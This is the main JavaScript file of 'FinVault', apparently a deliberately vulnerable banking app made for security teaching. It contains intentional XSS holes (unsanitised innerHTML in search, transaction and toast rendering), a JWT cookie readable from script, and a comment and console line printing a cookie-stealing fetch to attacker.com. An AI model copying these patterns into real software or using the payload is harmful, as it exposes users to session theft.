/**
 * FinVault — Main JavaScript
 *
 * NOTE: This file intentionally contains vulnerable patterns for educational purposes.
 * The innerHTML usages below are the XSS vulnerabilities (Vulnerability #2).
 */

'use strict';

// ============================================================
// JWT Token utilities (tokens are NOT HttpOnly — accessible via JS)
// ============================================================
const FinVault = {
    getToken() {
        const match = document.cookie.match('(^|;) ?jwt-token=([^;]*)(;|$)');
        return match ? match[2] : null;
    },

    decodeToken(token) {
        try {
            if (!token) return null;
            const parts = token.split('.');
            if (parts.length < 2) return null;
            const payload = atob(parts[1].replace(/-/g, '+').replace(/_/g, '/'));
            return JSON.parse(payload);
        } catch (e) {
            return null;
        }
    },

    getCurrentUser() {
        const token = this.getToken();
        return this.decodeToken(token);
    }
};

// ============================================================
// On page load
// ============================================================
document.addEventListener('DOMContentLoaded', function () {
    highlightActiveNav();
    initTooltips();
    displayTokenInfo();
});

function highlightActiveNav() {
    const path = window.location.pathname;
    document.querySelectorAll('.nav-link').forEach(link => {
        const href = link.getAttribute('href');
        if (href && path.startsWith(href) && href !== '/') {
            link.classList.add('active');
            link.style.color = 'var(--gold)';
        }
    });
}

function initTooltips() {
    const tooltips = document.querySelectorAll('[data-bs-toggle="tooltip"]');
    tooltips.forEach(el => new bootstrap.Tooltip(el));
}

/**
 * Display JWT token info in browser console.
 * VULNERABILITY: Token is accessible via JavaScript (no HttpOnly flag).
 * An XSS payload can steal the token: fetch('//attacker.com/?t=' + document.cookie)
 */
function displayTokenInfo() {
    const token = FinVault.getToken();
    if (token) {
        const payload = FinVault.decodeToken(token);
        console.group('%cFinVault JWT Token (Accessible via JS — no HttpOnly!)', 'color:#c9a84c;font-weight:bold');
        console.log('%cFull token:', 'color:#7a8aa0', token);
        console.log('%cDecoded payload:', 'color:#7a8aa0', payload);
        console.log('%cSteal with: fetch("https://attacker.com/steal?t=" + document.cookie)', 'color:#e74c3c');
        console.groupEnd();
    }
}

// ============================================================
// VULNERABILITY #2: XSS Helper — used in search results
// innerHTML renders unsanitized content
// ============================================================

/**
 * Renders search term into DOM via innerHTML — REFLECTED XSS
 * Called from search.html inline script.
 */
function renderSearchTerm(query) {
    const el = document.getElementById('search-term');
    if (el && query) {
        // VULNERABILITY: innerHTML used here — XSS if query contains HTML/JS
        el.innerHTML = query;
    }
}

/**
 * Renders a transaction row via innerHTML — STORED XSS
 * Description comes from DB without sanitization.
 */
function renderTransactionRow(tx) {
    const tr = document.createElement('tr');
    const amountClass  = tx.transactionType === 'CREDIT' ? 'text-success' : 'text-danger';
    const amountPrefix = tx.transactionType === 'CREDIT' ? '+' : '';
    const badgeClass   = tx.transactionType === 'CREDIT' ? 'bg-success' : 'bg-danger';
    const date         = tx.createdAt ? tx.createdAt.substring(0, 10) : 'N/A';

    // VULNERABILITY: tx.description rendered via innerHTML — stored XSS
    tr.innerHTML = `
        <td class="ps-3">${tx.description}</td>
        <td><span class="badge ${badgeClass}">${tx.transactionType}</span></td>
        <td class="text-muted small">${date}</td>
        <td class="text-end pe-3 fw-bold ${amountClass}">
            ${amountPrefix}$${Math.abs(parseFloat(tx.amount)).toFixed(2)}
        </td>
    `;
    return tr;
}

// ============================================================
// Flash messages / notifications
// ============================================================
function showToast(message, type = 'success') {
    const container = document.getElementById('toast-container') || createToastContainer();
    const toast = document.createElement('div');
    toast.className = `toast align-items-center text-bg-${type} border-0 show mb-2`;
    toast.setAttribute('role', 'alert');
    toast.innerHTML = `
        <div class="d-flex">
            <div class="toast-body">${message}</div>
            <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast"></button>
        </div>
    `;
    container.appendChild(toast);
    setTimeout(() => toast.remove(), 4000);
}

function createToastContainer() {
    const div = document.createElement('div');
    div.id = 'toast-container';
    div.style.cssText = 'position:fixed;top:70px;right:20px;z-index:9999;min-width:300px;';
    document.body.appendChild(div);
    return div;
}

// ============================================================
// Format currency
// ============================================================
function formatCurrency(amount) {
    return new Intl.NumberFormat('en-US', {style: 'currency', currency: 'USD'}).format(amount);
}

// ============================================================
// Copy to clipboard
// ============================================================
function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(() => showToast('Copied to clipboard'));
}
